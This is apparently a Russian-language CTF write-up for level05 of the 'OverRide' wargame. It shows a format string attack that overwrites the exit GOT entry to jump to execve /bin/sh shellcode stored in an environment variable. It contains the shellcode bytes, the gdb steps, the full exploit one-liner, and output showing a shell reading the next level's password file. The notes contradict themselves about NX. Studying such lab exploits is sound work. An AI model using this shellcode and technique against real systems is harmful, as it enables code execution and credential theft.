No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05

No RELRO   - нет защиты от перемещения
No canary found- нет канареечной защиты
NX enabled - Стек не может быть выполнен
No PIE - нет рандомизации базового адреса
No RPATH  - нет жестких путей загрузки библиотек
No RUNPATH - нет жестких путей загрузки библиотек

./level05
123
123

программа выводит то что мы ввели

ltrace ./level05
__libc_start_main(0x8048444, 1, -10412, 0x8048520, 0x8048590 <unfinished ...>
fgets(12345
"12345\n", 100, 0xf7fcfac0)                                                                  = 0xffffd648
printf("12345\n"12345
)
fgets проверяет размер до 100

При попытке ввести 200 символов ничего интересного не происходит так что размер буфера = 100

Так же мы видим то что мы ввели выводится через принтф
./level05
%x%x%x
64f7fcfac00

становится понятно что он не защищен

python -c 'print "AAAA" + "-%x" * 21' | ./level05

aaaa-64-f7fcfac0-0-0-0-0-ffffffff-ffffd6f4-f7fdb000-61616161

10 позиция

Двоичный код считывает ввод из стандартного ввода и распечатывает
ту же строку после применения к строке «tolower».
Буфер печатается с помощью printf, поэтому мы проведем атаку строкового формата,
 чтобы перезаписать адрес функции, хранящийся в функции exit plt.

вспоминаем шелкод "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
помещаем его в переменные среды

export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`

x90 это инструкция nope
'\x90' * 100  <--- чтобы удобнее позиционировать и посмотреть память
с помощью GDB мы можем найти его в памяти

gdb ./level05
break main // потому что при вызове мэйна подгружаются переменные среды и тп
r
(gdb) x/s *((char **)environ)
0xffffd85c:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"

(gdb) x/32wx 0xffffd85c
получили представление шелл-кода в памяти:
0xffffd85c:     0x4c454853      0x444f434c      0x90903d45      0x90909090
0xffffd86c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd87c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd88c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd89c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8bc:     0x90909090      0x90909090      0x90909090      0xc0319090
0xffffd8cc:     0x2f2f6850      0x2f686873      0x896e6962      0x89c189e3
(gdb)

мы можем выбрать отсюда любой адрес который содержит nope (0x90)


так же нам надо получить GOT функции exit
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
x/i 0x08048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0

Проблема заключается в том что адрес нашего шел кода очень большой для printf(); (0xffffd86c)
поэтому мы может воспользоваться модификатором %hn

разбиваем на 2 части 0xffffd86c

d86c = 55404 - 8(весь первый адрес) = 55396
ffff = 65535 - 55404 = 10131

Общая схема                                              d86c       10-я поз.    ffff      смежное значение
"exit addr 2 first bytes" + "exit addr 2 last bytes" + "%55396d" + "%10$hn" + "%10131d" + "%11$hn"

  (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55396d' + '%10\$hn' + '%10131d' + '%11\$hn'"; cat - ) | ./level05

  80
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
^Z
[3]+  Stopped                 ( python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55396d' + '%10\$hn' + '%10131d' + '%11\$hn'"; cat - ) | ./level05
level05@OverRide:~$ su level06
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level06/level06
level06@OverRide:~$
